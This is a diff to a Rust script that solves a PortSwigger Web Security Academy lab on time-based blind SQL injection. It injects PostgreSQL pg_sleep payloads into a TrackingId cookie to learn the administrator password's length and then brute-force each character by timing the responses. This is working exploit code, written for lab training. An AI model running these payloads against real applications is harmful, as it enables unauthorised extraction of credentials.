@@ -2,12 +2,12 @@
 *
 * Author: Ahmed Elqalawy (@elqal3awii)
 *
-* Date: 21/9/2023
+* Date: 24/9/2023
 *
-* Lab: Blind SQL injection with conditional responses
+* Lab: Blind SQL injection with time delays and information retrieval
 *
 * Steps: 1. Inject payload into 'TrackingId' cookie to determine the length of
-*           administrator's password based on conditional responses
+*           administrator's password based on time delays
 *        2. Modify the payload to brute force the administrator's password
 *        3. Fetch the login page
 *        4. Extract csrf token and session cookie
@@ -29,7 +29,7 @@ use select::{document::Document, predicate::Attr};
 use std::{
     collections::HashMap,
     io::{self, Write},
-    time::Duration,
+    time::{self, Duration},
 };
 use text_colorizer::Colorize;
 
@@ -38,7 +38,7 @@ use text_colorizer::Colorize;
 *******************/
 fn main() {
     // change this to your lab URL
-    let url = "https://0a49004903c7da8b84da9c8a00f000b5.web-security-academy.net";
+    let url = "https://0a3b00dc03bd5812811f43e500f2005d.web-security-academy.net";
     // build the client that will be used for all subsequent requests
     let client = build_client();
 
@@ -130,7 +130,7 @@ fn main() {
 fn build_client() -> Client {
     ClientBuilder::new()
         .redirect(Policy::none())
-        .connect_timeout(Duration::from_secs(5))
+        .connect_timeout(Duration::from_secs(10))
         .build()
         .unwrap()
 }
@@ -191,17 +191,6 @@ fn extract_session_multiple_cookies(headers: &HeaderMap) -> Option<String> {
     }
 }
 
-/*******************************************
-* Function to extract a pattern form a text
-********************************************/
-fn extract_pattern(pattern: &str, text: &str) -> Option<String> {
-    let pattern = Regex::new(pattern).unwrap();
-    if let Some(text) = pattern.find(text) {
-        Some(text.as_str().to_string())
-    } else {
-        None
-    }
-}
 
 /*******************************************
 * Function to determine password length
@@ -217,11 +206,13 @@ fn determine_password_length(client: &Client, url: &str) -> usize {
         io::stdout().flush();
         // payload to determine password length
         let payload = format!(
-            "' or length((select password from users where username = 'administrator')) = {} -- -",
+          "' || (SELECT CASE WHEN length((select password from users where username = 'administrator')) = {} THEN pg_sleep(5) ELSE pg_sleep(0) END)-- -",
             i
         );
+        // capture the time before sending the request
+        let start_time = time::Instant::now();
         // fetch the page with the injected payload
-        let injection = client
+        client
             .get(format!("{url}/filter?category=Pets"))
             .header("Cookie", format!("TrackingId={payload}"))
             .send()
@@ -230,13 +221,8 @@ fn determine_password_length(client: &Client, url: &str) -> usize {
                 "[!] Failed to fetch the page with the injected payload to determine password length"
                     .red()
             ));
-
-        let mut body = injection.text().unwrap();
-        // extract the name of users table
-        let welcom_text = extract_pattern("Welcome back!", &body);
-
-        // if the welcome text is returned in the response
-        if welcom_text.is_some() {
+        // if the request take 5 or more than 5 seconds to succeeded
+        if start_time.elapsed().as_secs() >= 5 {
             println!(
                 " [ {} {} ]",
                 "Correct length:".white(),
@@ -268,12 +254,14 @@ fn brute_force_password(client: &Client, url: &str, password_length: usize) -> S
             io::stdout().flush();
             // payload to brute force password
             let payload = format!(
-            "' or substring((select password from users where username = 'administrator'), {}, 1) = '{}' -- -",
-            position,
-            character
-        );
+                "' || (SELECT CASE WHEN substring((select password from users where username = 'administrator'), {}, 1) = '{}' THEN pg_sleep(5) ELSE pg_sleep(0) END)-- -",
+                position,
+                character
+            );
+            // capture the time before sending the request
+            let start_time = time::Instant::now();
             // fetch the page with the injected payload
-            let injection = client
+            client
                 .get(format!("{url}/filter?category=Pets"))
                 .header("Cookie", format!("TrackingId={payload}"))
                 .send()
@@ -282,14 +270,8 @@ fn brute_force_password(client: &Client, url: &str, password_length: usize) -> S
                 "[!] Failed to fetch the page with the injected payload to brute force password"
                     .red()
             ));
-
-            // body of the response
-            let mut body = injection.text().unwrap();
-            // extract the name of users table
-            let welcom_text = extract_pattern("Welcome back!", &body);
-
-            // if the welcome text is returned in the response
-            if welcom_text.is_some() {
+            // if the request take 5 or more than 5 seconds to succeeded
+            if start_time.elapsed().as_secs() >= 5 {
                 correct_password.push(character);
                 print!(
                     " [ {} {} ]",
